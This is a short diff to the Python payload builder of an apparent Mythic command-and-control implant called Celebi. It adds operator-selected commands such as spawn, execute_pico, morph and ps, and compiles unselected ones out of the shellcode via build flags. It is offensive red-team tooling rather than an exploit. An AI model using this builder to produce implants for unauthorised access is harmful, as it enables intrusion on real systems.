@@ -40,6 +40,10 @@ class CelebiAgent(PayloadType):
 			"debug": self.get_parameter("debug"),
 			"exit_func": self.get_parameter("exit_func")
 		}
+		# Feature selection: Mythic sends the operator's checked commands here
+		# (supports_dynamic_loading). Anything not selected is compiled out of
+		# the shellcode via -DCELEBI_NO_<CMD>.
+		parameters["commands"] = self.commands.get_commands() if self.commands else []
 		self.build_pic(parameters)
 		
 		resp = BuildResponse(status=BuildStatus.Success)
@@ -164,7 +168,20 @@ class CelebiAgent(PayloadType):
 			cflags.append("-DCELEBI_DEBUG")
 		if parameters["exit_func"] == "thread":
 			cflags.append("-DCELEBI_EXIT_THREAD")
-		
+
+		# Compile out commands the operator didn't select. Default (empty list
+		# or a bare build) keeps every command.
+		all_commands = [
+			"exit", "sleep", "whoami", "register", "unregister", "execute_pico",
+			"morph", "link", "unlink", "spawn", "spawnto",
+			"ls", "ps", "cat", "pwd", "change", "cd",
+		]
+		selected = set(parameters.get("commands") or [])
+		if len(selected) > 0:
+			for cmd in all_commands:
+				if cmd not in selected:
+					cflags.append("-DCELEBI_NO_{}".format(cmd.upper()))
+
 		if len(cflags) > 0:
 			cflags_str = "CFLAGS=\"{}\"".format(" ".join(cflags))
 			proc = subprocess.Popen(["make", "pic", cflags_str], stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd="/Mythic/celebi_pic/")
